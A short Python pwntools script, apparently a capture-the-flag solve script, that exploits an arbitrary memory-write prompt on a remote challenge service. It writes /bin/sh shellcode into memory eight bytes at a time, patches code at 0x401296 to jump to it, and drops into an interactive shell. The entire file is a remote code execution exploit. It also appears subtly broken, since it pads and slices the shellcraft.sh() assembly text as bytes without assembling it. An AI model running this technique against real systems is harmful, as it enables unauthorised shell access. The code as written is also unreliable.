import argparse

from pwn import *

context.arch = 'amd64'
context.terminal = ['kitty']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")

args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

sc = shellcraft.sh()

base = 0x4010b0
for i in range(0, len(sc), 8):
    r.sendlineafter(b"(hex)", hex(base+i)[2:])
    r.sendlineafter(b'(hex)', sc[i:i+8].ljust(8, b'\x00')[::-1].hex())
    r.sendlineafter(b'?', b'1')

r.sendlineafter(b"(hex)", b'401296')
r.sendlineafter(b'(hex)', asm("mov eax, 0x4010b0; call rax;").ljust(8, b'\x00')[::-1].hex())
r.interactive()
